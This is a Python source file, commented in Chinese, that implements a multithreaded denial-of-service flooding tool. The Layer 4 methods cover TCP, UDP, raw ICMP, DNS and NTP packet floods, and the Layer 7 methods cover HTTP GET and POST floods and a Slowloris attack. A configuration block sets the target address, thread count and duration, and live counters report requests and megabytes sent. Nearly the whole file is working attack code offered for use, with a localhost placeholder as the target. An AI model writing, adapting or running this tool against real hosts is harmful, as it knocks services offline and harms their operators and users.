import random
import socket
from socket import *
from threading import Thread, Event, Lock
from time import time, sleep
from os import urandom
from struct import pack
from contextlib import suppress
import urllib.parse

# --- 线程安全的计数器 ---
class Counter:
    def __init__(self, value=0):
        self.value = value
        self._lock = Lock()

    def add(self, amount):
        with self._lock:
            self.value += amount

REQUESTS_SENT_COUNTER = Counter()
BYTES_SENT_COUNTER = Counter()

# --- 基础攻击类 ---
class AttackThread(Thread):
    def __init__(self, target, method, event):
        super().__init__(daemon=True)
        self.target = target  # (ip, port)
        self.method = method
        self.event = event

    def run(self):
        self.event.wait()
        method_func = getattr(self, f"attack_{self.method.lower()}", self.attack_default)
        while self.event.is_set():
            method_func()

    def attack_default(self):
        print(f"\n[!] 方法 {self.method} 尚未实现。")
        self.event.clear()

# --- 第 4 层 (传输层) 修复与补充 ---
class Layer4(AttackThread):
    def attack_tcp(self):
        with suppress(Exception), socket(AF_INET, SOCK_STREAM) as s:
            s.settimeout(2)
            s.connect(self.target)
            while self.event.is_set():
                packet = urandom(1024)
                s.send(packet)
                REQUESTS_SENT_COUNTER.add(1)
                BYTES_SENT_COUNTER.add(len(packet))

    def attack_udp(self):
        with suppress(Exception), socket(AF_INET, SOCK_DGRAM) as s:
            while self.event.is_set():
                packet = urandom(1024)
                s.sendto(packet, self.target)
                REQUESTS_SENT_COUNTER.add(1)
                BYTES_SENT_COUNTER.add(len(packet))

    def attack_icmp(self):
        # 需要 Root/Admin 权限
        with suppress(Exception), socket(AF_INET, SOCK_RAW, IPPROTO_ICMP) as s:
            while self.event.is_set():
                # 构造简单的 ICMP Echo Request (Type 8)
                packet = pack("!BBHHH", 8, 0, 0, 0, 0) + urandom(32)
                s.sendto(packet, self.target)
                REQUESTS_SENT_COUNTER.add(1)
                BYTES_SENT_COUNTER.add(len(packet))

    def attack_dns(self):
        with suppress(Exception), socket(AF_INET, SOCK_DGRAM) as s:
            # 构造一个简单的查询 google.com 的 DNS 数据包
            packet = b"\xaa\xbb\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00" \
                     b"\x06google\x03com\x00\x00\x01\x00\x01"
            while self.event.is_set():
                s.sendto(packet, self.target)
                REQUESTS_SENT_COUNTER.add(1)
                BYTES_SENT_COUNTER.add(len(packet))

    def attack_ntp(self):
        with suppress(Exception), socket(AF_INET, SOCK_DGRAM) as s:
            # NTP 客户端请求模式 (Mode 3)
            packet = pack("!B", 0x1B) + b"\x00" * 47
            while self.event.is_set():
                s.sendto(packet, self.target)
                REQUESTS_SENT_COUNTER.add(1)
                BYTES_SENT_COUNTER.add(len(packet))

# --- 第 7 层 (应用层) 修复与增强 ---
class Layer7(AttackThread):
    def attack_http_get(self):
        # 循环外连接，循环内发送；若断开则自动重连
        while self.event.is_set():
            with suppress(Exception), socket(AF_INET, SOCK_STREAM) as s:
                s.settimeout(2)
                s.connect(self.target)
                while self.event.is_set():
                    # 加入随机参数防止缓存
                    path = f"/?q={random.randint(1, 999999)}"
                    request = (f"GET {path} HTTP/1.1\r\n"
                               f"Host: {self.target[0]}\r\n"
                               f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n"
                               f"Accept: */*\r\n\r\n").encode()
                    s.send(request)
                    REQUESTS_SENT_COUNTER.add(1)
                    BYTES_SENT_COUNTER.add(len(request))

    def attack_http_post(self):
        while self.event.is_set():
            with suppress(Exception), socket(AF_INET, SOCK_STREAM) as s:
                s.settimeout(2)
                s.connect(self.target)
                while self.event.is_set():
                    body = f"user=admin&pass={urandom(8).hex()}"
                    request = (f"POST / HTTP/1.1\r\n"
                               f"Host: {self.target[0]}\r\n"
                               f"Content-Type: application/x-www-form-urlencoded\r\n"
                               f"Content-Length: {len(body)}\r\n\r\n"
                               f"{body}").encode()
                    s.send(request)
                    REQUESTS_SENT_COUNTER.add(1)
                    BYTES_SENT_COUNTER.add(len(request))

    def attack_slowloris(self):
        # 这种攻击需要占用大量 Socket，建议增加线程数
        while self.event.is_set():
            with suppress(Exception), socket(AF_INET, SOCK_STREAM) as s:
                s.settimeout(2)
                s.connect(self.target)
                s.send(f"GET /?{random.randint(1, 5000)} HTTP/1.1\r\n".encode())
                s.send(f"Host: {self.target[0]}\r\n".encode())
                # 持续发送微量头部，不让连接关闭
                while self.event.is_set():
                    sleep(10)
                    keep_alive = f"X-a: {random.randint(1, 5000)}\r\n".encode()
                    s.send(keep_alive)
                    REQUESTS_SENT_COUNTER.add(1)

# --- 主逻辑控制 ---
def main():
    # --- 配置区 ---
    target_ip = "127.0.0.1"    # 目标
    target_port = 80           # 目标端口
    method = "http_get"        # 模式 (tcp/udp/icmp/dns/ntp/http_get/http_post/slowloris)
    threads_count = 100        # 并发线程数
    duration = 30              # 持续时长 (秒)
    # --------------

    target = (target_ip, target_port)
    event = Event()
    thread_list = []

    layer4_methods = {"tcp", "udp", "syn", "ack", "rst", "icmp", "ntp", "dns", "ssdp"}

    print(f"[*] 任务已创建: {target_ip}:{target_port} | 模式: {method}")
    print(f"[*] 正在初始化 {threads_count} 个线程...")

    for _ in range(threads_count):
        if method.lower() in layer4_methods:
            t = Layer4(target, method, event)
        else:
            t = Layer7(target, method, event)
        t.start()
        thread_list.append(t)

    print("[*] 线程启动完毕，开始发送流量...")
    event.set()
    
    start_time = time()
    try:
        while time() - start_time < duration:
            elapsed = int(time() - start_time)
            # 每秒更新一次统计
            print(f"\r[+] 时间: {elapsed}/{duration}s | 请求: {REQUESTS_SENT_COUNTER.value} | 流量: {BYTES_SENT_COUNTER.value / 1024 / 1024:.2f} MB", end="")
            sleep(1)
    except KeyboardInterrupt:
        print("\n[!] 收到用户中断指令。")

    event.clear()
    print(f"\n\n--- 最终统计报告 ---")
    print(f"目标地址: {target_ip}:{target_port}")
    print(f"发送总次数: {REQUESTS_SENT_COUNTER.value}")
    print(f"发送总流量: {BYTES_SENT_COUNTER.value / 1024 / 1024:.2f} MB")
    print("[*] 所有任务已完成。")

if __name__ == "__main__":
    main()
